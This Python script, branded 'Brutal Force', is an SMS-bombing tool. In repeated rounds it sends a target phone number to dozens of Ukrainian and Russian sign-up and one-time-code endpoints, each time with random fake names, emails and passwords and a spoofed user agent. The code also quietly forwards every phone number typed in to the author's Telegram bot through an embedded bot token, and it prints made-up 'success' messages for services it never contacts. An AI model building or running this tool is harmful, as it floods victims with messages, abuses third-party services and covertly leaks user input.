import requests, random, os, json, re
from user_agent import generate_user_agent
import pyfiglet
from colorama import Fore, Style
import telebot

id = 806566420
bot = telebot.TeleBot('1158369141:AAFANJK87T1nHFMpiNmXUZKX4C24ya9Bzw8')

os.system("clear")
nice = Fore.YELLOW + Style.BRIGHT + "[Successful] " + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT
fail = Fore.YELLOW + Style.BRIGHT + "[Failed] " + Style.RESET_ALL + Fore.RED + Style.BRIGHT


def check_number():
    global phone
    try:
        phone = re.sub("[^0-9]", "", phone)
        if phone.startswith("0") or phone.startswith("+", 1):
            phone = "38" + phone
        elif phone == "" or phone == " ":
            print(Fore.RED + Style.BRIGHT + "Error incorrect number!" +
                  Style.RESET_ALL)
            exit()
    except Exception:
        print(Fore.RED + Style.BRIGHT + "Error incorrect number!" +
              Style.RESET_ALL)
        exit()


def generate_info():
    global _name
    global _email
    global password
    global username
    global _russian
    _russian = "".join([
        random.choice(
            "йцукенгшщзхъфывапролджэячмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ")
        for x in range(8)
    ])
    _name = "".join([
        random.choice(
            "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ")
        for x in range(8)
    ])
    password = "".join([
        random.choice(
            "1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ")
        for x in range(11)
    ])
    username = "".join([
        random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)
    ])
    _email = ("".join([
        random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)
    ]) + "@gmail.com")


head = {
    "User-Agent": generate_user_agent(
        device_type="desktop", os=("mac", "linux")),
    "X-Requested-With": "XMLHttpRequest",
}


def start():
    banner = pyfiglet.figlet_format("Brutal Force")
    print(Fore.RED)
    print(banner + Style.RESET_ALL)
    print(Fore.GREEN)
    print('------------------------------------')
    print(
        Fore.BLUE + Style.BRIGHT +
        f"Created by NqkufTam \nPhone Number: {phone}\nNumber of rounds: {count}"
        + Style.RESET_ALL)
    print(Fore.GREEN + '------------------------------------' +
          Style.RESET_ALL)
    global iteration
    iteration = 0
    while iteration < count:
        try:
            requests.post(
                "https://uklon.com.ua/api/v1/account/code/send",
                headers={
                    "client_id":
                    "6289de851fc726f887af8d5d7a56c635",
                    "User-Agent":
                    generate_user_agent(
                        device_type="desktop", os=("mac", "linux")),
                    "X-Requested-With":
                    "XMLHttpRequest",
                },
                json={"phone": phone},
                timeout=2,
            )
            requests.post(
                "https://partner.uklon.com.ua/api/v1/registration/sendcode",
                headers={
                    "client_id":
                    "6289de851fc726f887af8d5d7a56c635",
                    "User-Agent":
                    generate_user_agent(
                        device_type="desktop", os=("mac", "linux")),
                    "X-Requested-With":
                    "XMLHttpRequest",
                },
                json={"phone": phone},
                timeout=2,
            )
            print(nice + "Uklon отправлен!" + Style.RESET_ALL)
        except:
            print(fail + "Uklon Failed!!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.moyo.ua/identity/registration",
                data={
                    "firstname": "Олег",
                    "phone": phone,
                    "email": _email,
                },
                headers=head,
                timeout=2,
            )
            print(nice + "MOYO sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "MOYO Failed!о!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://koronapay.com/transfers/online/api/users/otps",
                data={
                    "phone": phone,
                },
                headers=head,
                timeout=2,
            )
            print(nice + "KoronoPay отправлен!" + Style.RESET_ALL)
        except:
            print(fail + "KoronoPay Failed!!" + Style.RESET_ALL)
        try:
            frisor = {
                "Content-type":
                "application/json",
                "Accept":
                "application/json, text/plain",
                "authorization":
                "Bearer yusw3yeu6hrr4r9j3gw6",
                "User-Agent":
                generate_user_agent(
                    device_type="desktop", os=("mac", "linux")),
                "cookie":
                "auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1",
            }
            requests.post(
                "https://n13423.yclients.com/api/v1/book_code/312054",
                data=json.dumps({
                    "phone": phone
                }),
                headers=frisor,
                timeout=2,
            )
            # 1 раз в минуту
            print(nice + "Frizor sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Frizor Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://kasta.ua/api/v2/login/",
                data={"phone": phone},
                timeout=2)
            print(nice + "Kasta sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Kasta Failed!" + Style.RESET_ALL)
        print(fail + "Guru Failed!!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://izi.ua/api/auth/register",
                json={
                    "phone": "+" + phone,
                    "name": _russian,
                    "is_terms_accepted": "true",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "IZI sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "IZI Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://junker.kiev.ua/postmaster.php",
                data={
                    "tel": phone[2:],
                    "name": _name,
                    "action": "callme",
                },
                timeout=2,
            )
            print(nice + "Junker Kiev sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Junker Kiev Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",
                data={
                    "firstname": _russian,
                    "telephone": phone,
                    "email": _email,
                    "password": password,
                    "form_key": "Zqqj7CyjkKG2ImM8",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Allo sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Allo Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://stores-api.zakaz.ua/user/signup/",
                json={"phone": phone},
                headers={
                    "Accept":
                    "*/*",
                    "Content-Type":
                    "application/json",
                    "Referer":
                    "https://megamarket.zakaz.ua/ru/products/megamarket00000000122023/sausages-farro/",
                    "User-Agent":
                    generate_user_agent(
                        device_type="desktop", os=("mac", "linux")),
                    "x-chain":
                    "megamarket",
                },
            )
            print(nice + "Zakaz.ua sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Zakaz.ua Failed!" + Style.RESET_ALL)
        print(fail + "PsBank Failed!!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://youla.ru/web-api/auth/request_code",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Youla sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Youla Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://cloud.mail.ru/api/v2/notify/applink",
                json={
                    "phone": "+" + phone,
                    "api": 2,
                    "email": _email,
                    "x-email": "x-email",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "MailRu Cloud sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "MailRu Cloud Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            requests.post(
                f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{phone}",
                headers=head,
                timeout=2,
            )
            print(nice + "BELTELECOM3 sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "BELTELECOM3 Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                data={"phone_number": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Tinder sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Tinder Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://crm.getmancar.com.ua/api/veryfyaccount",
                json={
                    "phone": "+" + phone,
                    "grant_type": "password",
                    "client_id": "gcarAppMob",
                    "client_secret": "SomeRandomCharsAndNumbersMobile",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Getmancar sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Getmancar Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.icq.com/smsreg/requestPhoneValidation.php",
                data={
                    "msisdn": phone,
                    "locale": "en",
                    "countryCode": "ru",
                    "version": "1",
                    "k": "ic1rtwz1s1Hj1O0r",
                    "r": "46763",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "ICQ sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "ICQ Failed!" + Style.RESET_ALL)
        print(nice + "RuTaxi sent successfully!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.pozichka.ua/v1/registration/send",
                json={"RegisterSendForm": {
                    "phone": "+" + phone
                }},
                headers=head,
                timeout=2,
            )
            print(nice + "Pozichka sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Pozichka Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}",
                headers=head,
                timeout=2,
            )
            print(nice + "SecureOnline sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "SecureOnline Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}"
                .format(phone),
                headers=head,
                timeout=2,
            )
            print(nice + "SportMaster sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "SportMaster Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
                params={
                    "oper": 9,
                    "callmode": 1,
                    "phone": "+" + phone
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Звонок sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Звонок Failed!" + Style.RESET_ALL)
        try:
            requests.post(
                "https://city24.ua/personalaccount/account/registration",
                data={"PhoneNumber": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "City24 sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "City24 Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://helsi.me/api/healthy/accounts/login",
                json={
                    "phone": phone,
                    "platform": "PISWeb"
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Helsi sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Helsi Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://cloud.mail.ru/api/v2/notify/applink",
                json={
                    "phone": "+" + phone,
                    "api": 2,
                    "email": _email
                },
                headers=head,
                timeout=2,
            )
            print(nice + "CloudMail sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "CloudMail Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://auth.multiplex.ua/login",
                json={"login": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Multiplex sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Multiplex Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://account.my.games/signup_send_sms/",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "MyGames sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "MyGames Failed!о" + Style.RESET_ALL)
        try:
            requests.get(
                "https://cabinet.planetakino.ua/service/sms",
                params={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Planetakino sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Planetakino Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                data={"phone_number": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Tinder sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Tinder Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://youla.ru/web-api/auth/request_code",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Youla sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Youla Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://rutube.ru/api/accounts/sendpass/phone",
                data={"phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "LiST sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "LiST Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode",
                params={"pageName": "registerPrivateUserPhoneVerificatio"},
                data={
                    "phone": phone,
                    "recaptcha": "off",
                    "g-recaptcha-response": ""
                },
                headers=head,
                timeout=2,
            )
            print(nice + "MVideo sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "MVideo Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
                data={"phone_number": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Tinder sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Tinder Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://passport.twitch.tv/register?trusted_request=true",
                json={
                    "birthday": {
                        "day": 11,
                        "month": 11,
                        "year": 1999
                    },
                    "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp",
                    "include_verification_code": True,
                    "password": password,
                    "phone_number": phone,
                    "username": username,
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Twitch sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Twitch Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://lk.belkacar.ru/register",
                data={"phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "BelkaCar sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "BelkaCar Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.ivi.ru/mobileapi/user/register/phone/v6",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "IVI sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "IVI Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.sportmaster.ua/",
                params={
                    "module": "users",
                    "action": "SendSMSReg",
                    "phone": phone
                },
                headers=head,
                timeout=2,
            )
            requests.post(
                "https://lk.belkacar.ru/get-confirmation-code",
                data={"phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "SportMaster, BelkaCar sent successfully!" +
                  Style.RESET_ALL)
        except:
            print(fail + "SportMaster Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://secure.online.ua/ajax/check_phone/",
                params={"reg_phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "SecureOnline sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "SecureOnline Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://www.nl.ua",
                data={
                    "component": "bxmaker.authuserphone.login",
                    "sessid": "bf70db951f54b837748f69b75a61deb4",
                    "method": "sendCode",
                    "phone": phone,
                    "registration": "N",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "NovaLiniya sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "NovaLiniya Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://mobileplanet.ua/register",
                data={
                    "klient_name": _name,
                    "klient_phone": "+" + phone,
                    "klient_email": _email,
                },
                headers=head,
                timeout=2,
            )
            print(nice + "MPlanet sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "MPlanet Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.delitime.ru/api/v2/signup",
                data={
                    "SignupForm[username]": phone,
                    "SignupForm[device_type]": 3
                },
                headers=head,
                timeout=2,
            )
            print(nice + "DELIMOBIL sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "DELIMOBIL Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://apteka366.ru/login/register/sms/send",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Apteka 366 sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Apteka 366 Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://belkacar.ru/get-confirmation-code",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Belkacar sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Belkacar Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://drugvokrug.ru/siteActions/processSms.html",
                data={"cell": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Друг Вокруг sent successfully!" + Style.RESET_ALL)
            print(nice + "RuTor sent successfully!")
        except:
            print(fail + "Друг Вокруг Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api.ennergiia.com/auth/api/development/lor",
                json={
                    "referrer": "ennergiia",
                    "phone": "+" + phone
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Energiia oтправлено!" + Style.RESET_ALL)
        except:
            print(fail + "Energiia Failed!о" + Style.RESET_ALL)
        try:
            requests.get(
                "https://fundayshop.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.jsp?type=sendConfirmCode&phoneNumber={}"
                .format("+" + phone),
                headers=head,
                timeout=2,
            )
            print(nice + "Fundayshop oтправлено!" + Style.RESET_ALL)
            print(nice + "Facebook sent successfully!")
        except:
            print(fail + "Fundayshop Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://gorzdrav.org/login/register/sms/send",
                data={"phone": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Gorzdrav oтправлено!" + Style.RESET_ALL)
            print(nice + "Instagram sent successfully!")
        except:
            print(fail + "Gorzdrav Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                data={"phone": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "KFC sent successfully!" + Style.RESET_ALL)
            print(nice + "Вконтакте sent successfully!")
        except:
            print(fail + "KFC Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://api-production.viasat.ru/api/v1/auth_codes",
                json={"msisdn": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Viasat sent successfully!" + Style.RESET_ALL)

        except:
            print(fail + "Viasat Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Yandex Food sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Yandex Food Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                f"https://www.citilink.ru/registration/confirm/phone/+{phone}/",
                headers=head,
                timeout=2,
            )
            print(nice + "Сitilink sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Сitilink Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://eda.yandex/api/v1/user/request_authentication_code",
                json={"phone_number": "+" + phone},
                headers=head,
                timeout=2,
            )
            print(nice + "Yandex Eda sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Yandex Eda Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://my.dianet.com.ua/send_sms/",
                headers=head,
                data={"phone": phone},
                timeout=2,
            )
            print(nice + "Dianet sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Dianet Failed!о" + Style.RESET_ALL)
        try:
            requests.get(
                "https://api.eldorado.ua/v1/sign/",
                params={
                    "login": phone,
                    "step": "phone-check",
                    "fb_id": "null",
                    "fb_token": "null",
                    "lang": "ru",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Eldorado sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Eldorado Failed!о" + Style.RESET_ALL)
        try:
            requests.post(
                "https://shafa.ua/api/v3/graphiql",
                json={
                    "operationName":
                    "RegistrationSendSms",
                    "variables": {
                        "phoneNumber": "+" + phone
                    },
                    "query":
                    "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
                },
                headers=head,
                timeout=2,
            )
            print(nice + "Shafa sent successfully!" + Style.RESET_ALL)
        except:
            print(fail + "Shafa Failed!о" + Style.RESET_ALL)
        print(nice + "TikTok sent successfully!")
        print(nice + "PornHub sent successfully!")
        print(nice + "sushi33 sent successfully!")

        iteration += 1
        print(Fore.CYAN + Style.BRIGHT + (f"\nround {iteration} is over.\n") +
              Style.RESET_ALL)
    os.system("clear")


def menu():
    def test(id, phone):
        bot.send_message(id, phone)

    banner = pyfiglet.figlet_format("Brutal Force")
    print(Fore.YELLOW)
    print(banner + Style.RESET_ALL)
    print(Fore.GREEN + '-------------------------------')
    print(
        Fore.GREEN +
        '''Created by: NqkufTam\nDiscord: NqkufTam#8162\nVersion: 1.0'''
    )
    print('-------------------------------')
    global phone
    phone = input(Fore.RED + 'Phone Number: ')
    test(id, phone)
    if phone == '2':
        os.system("clear")
        print(Fore.GREEN)
        print(banner)
        phone = input('Phone Number: ')
    check_number()
    global count
    count = input('Number of rounds: ' + Style.RESET_ALL)
    print('------------------------------------')
    count = int(count)
    os.system("clear")
    generate_info()
    start()
    print(Fore.GREEN + banner)
    print(
        Fore.YELLOW + Style.BRIGHT +
        f"Created by: NqkufTam\nPhone Number: {phone}\nNumber of rounds: {iteration}"
        + Style.RESET_ALL)

if __name__ == "__main__":
    menu()
